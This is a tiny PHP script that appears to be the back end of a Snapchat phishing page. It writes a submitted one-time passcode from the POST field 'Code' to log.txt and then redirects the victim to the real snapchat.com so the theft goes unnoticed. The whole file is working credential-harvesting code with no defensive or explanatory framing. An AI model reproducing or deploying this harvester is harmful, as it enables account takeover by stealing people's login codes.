<?php

    file_put_contents("log.txt", "OTP: " . $_POST['Code'] . "\n", FILE_APPEND);
header('Location: https://www.snapchat.com');
exit();